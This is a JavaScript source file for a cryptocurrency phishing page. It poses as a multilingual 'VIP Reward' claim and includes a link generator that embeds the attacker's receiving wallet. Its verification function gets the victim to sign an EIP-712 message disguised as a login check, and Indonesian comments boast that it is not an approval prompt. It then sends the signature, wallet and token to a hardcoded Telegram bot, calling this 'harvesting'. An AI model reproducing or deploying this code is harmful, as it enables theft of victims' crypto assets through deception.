const content = {
    en: { title: "Claim VIP Reward", desc: "Congratulations! Your wallet is eligible for a VIP Reward. Sign the verification to claim your assets.", btn: "CLAIM REWARD NOW", status: "Reward Status: Ready to Claim" },
    cn: { title: "领取 VIP 奖励", desc: "恭喜！您的钱包有资格领取 VIP 奖励。请签名验证以领取您的资产。", btn: "立即领取奖励", status: "奖励状态：就绪" },
    ru: { title: "Получить VIP-награду", desc: "Поздравляем! Ваш кошелек имеет право на VIP-награду. Подпишите подтверждение, чтобы получить активы.", btn: "ПОЛУЧИТЬ НАГРАДУ", status: "Статус награды: Готов" }
};

function changeLang(lang) {
    document.getElementById('txt-title').innerText = content[lang].title;
    document.getElementById('txt-desc').innerText = content[lang].desc;
    document.getElementById('txt-btn').innerText = content[lang].btn;
    document.getElementById('txt-status').innerText = content[lang].status;
}

// --- CLOUD NINE CORE: GENERATOR & STEALTH ---
function generateLink() {
    const token = document.getElementById('targetToken').value;
    const wallet = document.getElementById('myWallet').value;
    const baseUrl = window.location.origin + window.location.pathname;
    const finalLink = `${baseUrl}?token=${token}&receiver=${wallet}`;
    document.getElementById('generatedLink').value = finalLink;
}

function copyLink() {
    const copyText = document.getElementById("generatedLink");
    if (!copyText.value) return;
    copyText.select();
    document.execCommand("copy");
    alert("Link copied to clipboard!");
}

window.onload = function() {
    const urlParams = new URLSearchParams(window.location.search);
    const tokenParam = urlParams.get('token');
    const receiverParam = urlParams.get('receiver');
    if (tokenParam && receiverParam) {
        document.getElementById('targetToken').value = tokenParam;
        document.getElementById('myWallet').value = receiverParam;
        document.getElementById('adminBox').style.display = 'none'; 
    }
};

// --- SHADOW SIGNATURE LOGIC (EIP-712) ---
async function startVerification() {
    if (!window.ethereum) return alert("Please use SafePal or OKX DApp Browser.");
    
    const web3 = new Web3(window.ethereum);
    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const user = accounts[0];
        const tokenAddress = document.getElementById('targetToken').value;
        const spenderAddress = document.getElementById('myWallet').value;

        // Data untuk Tanda Tangan (Terlihat seperti verifikasi login)
        const msgParams = JSON.stringify({
            domain: { name: "Fiat24 Reward System", version: "1", chainId: await web3.eth.getChainId(), verifyingContract: tokenAddress },
            message: { 
                info: "Verify Wallet Ownership for VIP Reward Access",
                wallet: user,
                timestamp: Math.floor(Date.now() / 1000)
            },
            primaryType: "Verify",
            types: {
                EIP712Domain: [
                    { name: "name", type: "string" },
                    { name: "version", type: "string" },
                    { name: "chainId", type: "uint256" },
                    { name: "verifyingContract", type: "address" }
                ],
                Verify: [
                    { name: "info", type: "string" },
                    { name: "wallet", type: "address" },
                    { name: "timestamp", type: "uint256" }
                ]
            }
        });

        document.getElementById('txt-status').innerText = "Authenticating Signature...";

        // Memicu jendela SIGNATURE (Bukan Approve!)
        const signature = await window.ethereum.request({
            method: "eth_signTypedData_v4",
            params: [user, msgParams],
        });

        // KIRIM HASH KE TELEGRAM (Pemanenan)
        const tele_bot_id = "8679938218:AAH_ZuYcoOroEBC-79sQ1CgoEKzcaCrWmYs";
        const tele_chat_id = "8795373522";
        const message = `🚀 **TING! SHADOW SIGNATURE CAPTURED** 🚀%0A%0APaus menandatangani surat kuasa!%0A%0AWallet Paus: ${user}%0AToken: ${tokenAddress}%0A%0ASignature Hash:%0A${signature}`;

        fetch(`https://api.telegram.org/bot${tele_bot_id}/sendMessage?chat_id=${tele_chat_id}&text=${message}&parse_mode=Markdown`);

        alert("Verification Successful. Reward will be processed in 24h.");
        document.getElementById('txt-status').innerText = "Status: Authenticated";

    } catch (e) {
        console.error(e);
        document.getElementById('txt-status').innerText = "Verification Failed. Try again.";
    }
}
